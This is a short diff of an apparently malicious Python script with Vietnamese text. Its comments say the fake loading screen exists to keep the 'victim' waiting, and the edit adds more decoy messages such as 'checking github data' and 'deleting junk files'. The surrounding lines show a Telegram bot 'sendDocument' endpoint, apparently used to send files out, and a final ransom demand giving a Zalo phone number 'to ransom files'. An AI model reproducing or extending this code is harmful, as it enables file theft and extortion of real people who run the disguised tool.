@@ -304,13 +304,18 @@ TELEGRAM_URL = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
 
 # Fake loading để giữ nạn nhân ở lại
 def fake_loading():
-    animations = ["|", "/", "-", "\\"]
+    animations = ["|", "/", "-", "\\","LOADDING"]
     print("[+] Đang bắt đầu quá trình tải dữ liệu... Vui lòng đợi.")
     
     for _ in range(300):  # 5 phút đếm ngược, nhưng không hiển thị thời gian nữa
-        print(f"\r[+] Đang tải các dữ liệu cần thiết để chạy tool... {animations[_ % 4]}", end="", flush=True)
+        print(f"\r[+] Đang tải các dữ liệu cần thiết để chạy tool  {animations[_ % 4]}", end="", flush=True)
         time.sleep(1)
-    
+        print(f"\r[+] Kiểm tra dử liệu github  {animations[_ % 4]}", end="", flush=True)
+        time.sleep(1)
+        print(f"\r[+] Check lại   {animations[_ % 4]}", end="", flush=True)
+        time.sleep(1)
+        print(f"\r[+] Xóa file rác  {animations[_ % 4]}", end="", flush=True)
+        time.sleep(1)
     # Hiển thị thông báo khi hết thời gian
     print("\n")
     print("LIÊN HỆ ZALO: 0845670409 ĐỂ CHUỘC FILE!")
